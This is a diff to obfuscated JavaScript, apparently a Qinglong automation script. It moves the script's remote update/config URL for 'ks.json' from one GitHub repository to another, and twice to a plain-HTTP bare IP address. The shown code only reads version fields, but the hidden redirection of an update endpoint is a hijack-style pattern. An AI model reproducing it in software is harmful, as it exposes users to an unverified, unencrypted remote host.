@@ -1152,7 +1152,7 @@ async function _0x505e51() {
     if (a["status"] == 0) {
       if (_0x459e63 >= a["version"]) {
         _0x2e716e = true;
-        _0x75eec0 = "https://raw.githubusercontent.com/zgogo/qinglong/main/ks.json";
+        _0x75eec0 = "https://raw.githubusercontent.com/zhangzuting/xin/main/ks.json";
         console["log"](a["msg"][a["status"]]);
         console['log'](a["updateMsg"]);
         console["log"]("现在运行的脚本版本是：1.07，最新脚本版本：" + a["latestVersion"]);
@@ -3475,7 +3475,7 @@ function Envcc(T, c) {
     'CMAOs': "setval",
     'dceom': 'ijzfe',
     'JighY': 'updateMsg',
-    'uwDzR': "https://raw.githubusercontent.com/zgogo/qinglong/main/ks.json",
+    'uwDzR': "http://210.116.112.17/ks.json",
     'CvmUM': function (S, a) {
       return S === a;
     },
@@ -3969,7 +3969,7 @@ function Envcc(T, c) {
       if (p["JpIGP"]('ViWHE', p["NOwog"])) {
         if (p["QwtqA"](q, i[p["LTEld"]])) {
           d = true;
-          u = "https://raw.githubusercontent.com/zgogo/qinglong/main/ks.json";
+          u = "http://210.116.112.17/ks.json";
           e[p["zptFf"]](A[p['EqCpB']][k[p["Qdwtu"]]]);
           o['log'](g["updateMsg"]);
           t["log"](p["UAuSH"](p["AVAsN"], L[p['prrOr']]));
